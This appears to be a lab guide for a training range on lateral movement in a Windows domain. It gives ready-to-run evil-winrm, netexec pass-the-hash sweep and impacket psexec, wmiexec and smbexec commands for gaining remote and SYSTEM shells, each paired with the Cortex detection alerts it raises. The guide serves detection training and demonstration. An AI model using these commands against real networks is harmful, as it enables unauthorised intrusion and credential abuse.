# Tactic: Lateral Movement

**MITRE:** TA0008 — Lateral Movement
**Goal:** Use obtained credentials or hashes to move from one host to another across the network — gaining execution on additional systems and working toward the Domain Controller.

**Range variables used in this guide**

| Variable | What it represents |
|---|---|
| `<DC_IP>` | Domain Controller IP |
| `<WIN_CLIENT_IP>` | Windows 11 client IP |
| `<SUBNET_CIDR>` | Range subnet (e.g. 10.1.0.0/24) |
| `<DOMAIN>` | Active Directory domain name |
| `<USERNAME>` | Domain or local username |
| `<PASSWORD>` | Account password |
| `<NTLM_HASH>` | NTLM hash (for Pass-the-Hash) |

---

## Tool 1 — evil-winrm: WinRM Remote Shell

**What it does:** Opens an interactive PowerShell session on a Windows target over WinRM (port 5985/5986) using a password or an NTLM hash. The cleanest way to get a shell on a Windows host when WinRM is enabled — which it is by default on servers and often on workstations in a domain.

**MITRE:** T1021.006 — Remote Services: Windows Remote Management
**Targets:** DC · Windows Client
**Demo time:** ✅ Fast (~20 seconds)

---

### Give it a try

**Step 1 — Connect with a password**

```
evil-winrm -i <WIN_CLIENT_IP> -u <USERNAME> -p '<PASSWORD>'
```

**Step 2 — Connect with a hash (Pass-the-Hash)**

```
evil-winrm -i <WIN_CLIENT_IP> -u <USERNAME> -H <NTLM_HASH>
```

**Step 3 — Once in the shell, confirm identity and run a command**

```
whoami; hostname; ipconfig
```

**What to look for:** An `*Evil-WinRM* PS C:\>` prompt means you have a shell. Type `exit` to close it.

---

📸 **Screenshot:** `screenshots/03-lateral-movement/01-evil-winrm.png`
*Show: evil-winrm session established, whoami/hostname output in the shell*

**What Cortex sees**
> **Alert:** Rare WinRM Session · Rare Windows Remote Management (WinRM) HTTP Activity · Wsmprovhost.exe Rare Child Process
> **Severity:** Medium–High | **MITRE:** T1021.006

📸 **Screenshot:** `screenshots/03-lateral-movement/01-evil-winrm-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 2 — netexec: Pass-the-Hash Sweep

**What it does:** Authenticates to SMB across one or many hosts using an NTLM hash instead of a password. Identifies every host where a compromised account has access (and admin rights), mapping your lateral movement options in a single sweep.

**MITRE:** T1550.002 — Use Alternate Authentication Material: Pass the Hash
**Targets:** DC · Windows Client · entire subnet
**Demo time:** ✅ Fast (~20 seconds)

---

### Give it a try

**Step 1 — Pass-the-Hash across the whole subnet to find admin access**

```
netexec smb <SUBNET_CIDR> -u <USERNAME> -H <NTLM_HASH>
```

**What to look for:** Hosts showing `(Pwn3d!)` accept this hash with local admin rights — your lateral movement targets.

**Step 2 — Execute a command on a Pwn3d host via Pass-the-Hash**

```
netexec smb <WIN_CLIENT_IP> -u <USERNAME> -H <NTLM_HASH> -x "whoami"
```

---

📸 **Screenshot:** `screenshots/03-lateral-movement/02-netexec-pth.png`
*Show: netexec PtH sweep — Pwn3d! results and remote command output*

**What Cortex sees**
> **Alert:** Possible Pass-the-Hash · Rare NTLM Access By User To Host · A user authenticated with weak NTLM to multiple hosts
> **Severity:** High | **MITRE:** T1550.002

📸 **Screenshot:** `screenshots/03-lateral-movement/02-netexec-pth-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 3 — impacket-psexec: PsExec-Style Remote Execution

**What it does:** Creates a service on the remote host via SMB to execute commands as SYSTEM, giving a semi-interactive shell. The classic "psexec" lateral movement technique — reliable and high-privilege, but noisy (it drops a service binary).

**MITRE:** T1021.002 — SMB/Windows Admin Shares · T1569.002 — Service Execution
**Targets:** DC · Windows Client
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Get a SYSTEM shell with credentials**

```
impacket-psexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<WIN_CLIENT_IP>
```

**Step 2 — Or with a hash (Pass-the-Hash)**

```
impacket-psexec <DOMAIN>/<USERNAME>@<WIN_CLIENT_IP> -hashes :<NTLM_HASH>
```

**What to look for:** A `C:\Windows\system32>` prompt running as `nt authority\system`. Confirm with `whoami`.

---

📸 **Screenshot:** `screenshots/03-lateral-movement/03-psexec.png`
*Show: psexec SYSTEM shell established, whoami showing nt authority\system*

**What Cortex sees**
> **Alert:** Remote PsExec-like command execution · Attempt to execute a command on a remote host using PsExec.exe · PsExec was executed with a suspicious command line
> **Severity:** High | **MITRE:** T1021.002

📸 **Screenshot:** `screenshots/03-lateral-movement/03-psexec-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 4 — impacket-wmiexec: WMI Remote Execution

**What it does:** Executes commands on a remote host over WMI (port 135 + dynamic ports) without dropping a service binary. Stealthier than psexec — no service creation — but still gives command execution. Runs each command in a new process, so it's semi-interactive.

**MITRE:** T1047 — Windows Management Instrumentation
**Targets:** DC · Windows Client
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Execute commands over WMI with credentials**

```
impacket-wmiexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<WIN_CLIENT_IP>
```

**Step 2 — Or with a hash**

```
impacket-wmiexec <DOMAIN>/<USERNAME>@<WIN_CLIENT_IP> -hashes :<NTLM_HASH>
```

**What to look for:** A shell prompt. Unlike psexec this runs as the authenticating user (not SYSTEM) and leaves no service artifact.

---

📸 **Screenshot:** `screenshots/03-lateral-movement/04-wmiexec.png`
*Show: wmiexec shell established, command output*

**What Cortex sees**
> **Alert:** Command execution via wmiexec · Remote WMI process execution · WmiPrvSe.exe Rare Child Command Line
> **Severity:** High | **MITRE:** T1047

📸 **Screenshot:** `screenshots/03-lateral-movement/04-wmiexec-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*

---

## Tool 5 — impacket-smbexec: SMB Service Execution

**What it does:** Similar to psexec but uses a different execution mechanism — it creates a temporary service that runs commands and returns output via SMB, avoiding dropping a full binary. A third option in the lateral-movement toolkit, useful when psexec is detected or blocked.

**MITRE:** T1021.002 — SMB/Windows Admin Shares
**Targets:** DC · Windows Client
**Demo time:** ✅ Fast (~30 seconds)

---

### Give it a try

**Step 1 — Get a shell over SMB with credentials**

```
impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<WIN_CLIENT_IP>
```

**Step 2 — Or with a hash**

```
impacket-smbexec <DOMAIN>/<USERNAME>@<WIN_CLIENT_IP> -hashes :<NTLM_HASH>
```

**What to look for:** A semi-interactive shell. Each command spawns a service execution, so there's a slight delay per command.

---

📸 **Screenshot:** `screenshots/03-lateral-movement/05-smbexec.png`
*Show: smbexec shell established, command output*

**What Cortex sees**
> **Alert:** Remote service command execution from an uncommon source · Uncommon Service Create/Config · Remote service start from an uncommon source
> **Severity:** High | **MITRE:** T1021.002

📸 **Screenshot:** `screenshots/03-lateral-movement/05-smbexec-cortex.png`
*[Placeholder — insert Cortex alert screenshot here]*
